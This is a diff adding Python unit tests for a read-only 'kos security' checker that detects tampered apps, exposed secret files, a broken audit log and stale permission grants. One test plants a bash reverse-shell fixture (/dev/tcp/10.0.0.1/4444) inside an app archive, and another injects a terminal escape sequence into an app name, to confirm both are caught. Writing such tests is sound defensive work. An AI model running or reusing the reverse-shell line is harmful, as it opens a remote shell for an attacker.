@@ -523,6 +523,151 @@ class TestAuditChain(Env):
         self.assertIn("TAMPERED at line 1", text)
 
 
+class TestSecurityCheck(Env):
+    """`kos security`: read-only, no password, and it must actually fail when things are wrong."""
+
+    def setUp(self):
+        super().setUp()
+        from kos.permit import PermitStore
+        self.paths.ensure()
+        AppStore(self.paths).install(self.kapp, self.authority(PW))
+        PermitStore(self.paths).grant("hello", declared=[])
+        self.state = self.paths.state
+
+    def run_checks(self):
+        from kos.secure import run_checks
+        return run_checks(self.paths)
+
+    def levels(self, name):
+        return [c.level for c in self.run_checks() if c.name == name]
+
+    def detail(self, name):
+        return " | ".join(c.detail for c in self.run_checks() if c.name == name)
+
+    def test_a_healthy_install_has_no_failures(self):
+        checks = self.run_checks()
+        self.assertEqual([c for c in checks if c.level == "fail"], [])
+        self.assertEqual({c.name for c in checks},
+                         {"kernel", "password", "files", "audit log", "apps", "permissions", "owed", "leftovers"})
+        self.assertEqual(self.levels("password"), ["warn"])          # the test KDF (N=1024) is deliberately weak
+        self.assertIn("weak", self.detail("password"))
+        self.assertEqual(self.levels("apps"), ["pass"])
+
+    def test_an_app_modified_after_install_is_a_failure(self):
+        (self.paths.apps / "hello.kapp").write_bytes((self.paths.apps / "hello.kapp").read_bytes() + b"\0")
+        self.assertEqual(self.levels("apps"), ["fail"])
+        self.assertIn("modified since install: hello", self.detail("apps"))
+
+    def test_an_app_the_scanner_now_flags_is_a_failure_even_if_its_recorded_hash_was_updated(self):
+        import hashlib
+        kapp = self.paths.apps / "hello.kapp"
+        buf = io.BytesIO()
+        with zipfile.ZipFile(kapp) as src, zipfile.ZipFile(buf, "w") as dst:
+            for i in src.infolist():
+                dst.writestr(i.filename, src.read(i.filename))
+            dst.writestr("evil.py", "import os\nos.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\n")
+        kapp.write_bytes(buf.getvalue())
+        seal = self.paths.apps / "hello.seal"
+        meta = json.loads(seal.read_text())
+        meta["sha256"] = hashlib.sha256(buf.getvalue()).hexdigest()      # what a careless forger does
+        seal.write_text(json.dumps(meta))
+        self.assertEqual(self.levels("apps"), ["fail"])
+        self.assertIn("reverse-shell", self.detail("apps"))
+
+    def test_missing_pieces_of_an_install_are_a_failure(self):
+        (self.paths.apps / "hello.kapp").unlink()
+        self.assertEqual(self.levels("apps"), ["fail"])
+        self.assertIn("missing", self.detail("apps"))
+
+    def test_secrets_others_can_read_are_a_failure(self):
+        os.chmod(self.paths.auth_file, 0o644)
+        self.assertEqual(self.levels("files"), ["fail"])
+        self.assertIn("auth.json", self.detail("files"))
+
+    def test_a_tampered_audit_log_is_a_failure(self):
+        for i in range(4):
+            AuditLogFor_(self.paths).record("app.run", f"a{i}", "denied")
+        log = self.paths.logs / "audit.log"
+        lines = log.read_bytes().split(b"\n")
+        del lines[2]
+        log.write_bytes(b"\n".join(lines))
+        self.assertEqual(self.levels("audit log"), ["fail"])
+        self.assertIn("TAMPERED", self.detail("audit log"))
+
+    def test_grants_nothing_uses_and_grants_that_were_never_pinned_are_warnings(self):
+        grants = self.state / "permissions" / "grants.json"
+        data = json.loads(grants.read_text())
+        data.append({"app": "ghost-app", "resource": "run", "level": "use", "at": 1.0, "declared": []})
+        for e in data:
+            if e["app"] == "hello":
+                e.pop("declared", None)
+        grants.write_text(json.dumps(data))
+        self.assertEqual(self.levels("permissions"), ["warn", "warn"])
+        text = self.detail("permissions")
+        self.assertIn("ghost-app", text)
+        self.assertIn("hello", text)
+
+    def test_owed_work_and_interrupted_writes_are_warnings(self):
+        import time
+        (self.state / "owed.json").write_text(json.dumps(
+            [{"id": "x", "trigger": "file.write", "target": "/t", "owes": ["scan", "optimize"], "at": 1.0}]))
+        os.chmod(self.state / "owed.json", 0o600)
+        tmp = self.state / ".auth-throttle.json.tmp.1"
+        tmp.write_text("x")
+        os.utime(tmp, (time.time() - 7200,) * 2)
+        self.assertEqual(self.levels("owed"), ["warn"])
+        self.assertEqual(self.levels("leftovers"), ["warn"])
+        fresh = self.state / ".auth-throttle.json.tmp.2"
+        fresh.write_text("x")                       # a write in progress right now is not a leftover
+        self.assertIn("1 temporary", self.detail("leftovers"))
+
+    def test_a_check_that_crashes_is_reported_not_swallowed(self):
+        import kos.secure as secure
+        def boom(paths):
+            raise RuntimeError("disk on fire")
+        with mock.patch.object(secure, "CHECKS", (boom,)):
+            (c,) = secure.run_checks(self.paths)
+        self.assertEqual(c.level, "fail")
+        self.assertIn("disk on fire", c.detail)
+
+    def test_command_exit_code_and_output_is_safe_to_print(self):
+        import contextlib
+        import types
+        def run():
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                code = kcli.cmd_security(types.SimpleNamespace(), self.paths)
+            return code, out.getvalue()
+        code, text = run()
+        self.assertEqual(code, 0, text)
+        self.assertIn("Result:", text)
+        grants = self.state / "permissions" / "grants.json"
+        data = json.loads(grants.read_text())
+        data.append({"app": "\x1b[2Jfake", "resource": "run", "level": "use", "at": 1.0, "declared": []})
+        grants.write_text(json.dumps(data))
+        os.chmod(self.paths.auth_file, 0o666)
+        code, text = run()
+        self.assertEqual(code, 3)
+        self.assertNotIn("\x1b", text)
+
+    def test_it_needs_no_password_and_changes_nothing(self):
+        before = {p: p.read_bytes() for p in self.paths.root.rglob("*") if p.is_file()}
+        self.run_checks()
+        after = {p: p.read_bytes() for p in self.paths.root.rglob("*") if p.is_file()}
+        self.assertEqual(before, after)
+
+    def test_it_is_reachable_in_every_language_of_the_line_shell(self):
+        interpret = __import__("kos.lang", fromlist=["interpret"]).interpret
+        for line in ("security", "seguridad", "sécurité", "sicherheit", "sicurezza", "безопасность", "安全", "セキュリティ"):
+            r = interpret(line)
+            self.assertEqual((r.kind, list(r.argv)), ("command", ["security"]), line)
+
+
+def AuditLogFor_(paths):
+    from kos.auth import AuditLog
+    return AuditLog(paths)
+
+
 class TestHostileInput(Env):
     """Names and leftovers from disks, zips and crashes are not trusted."""
 
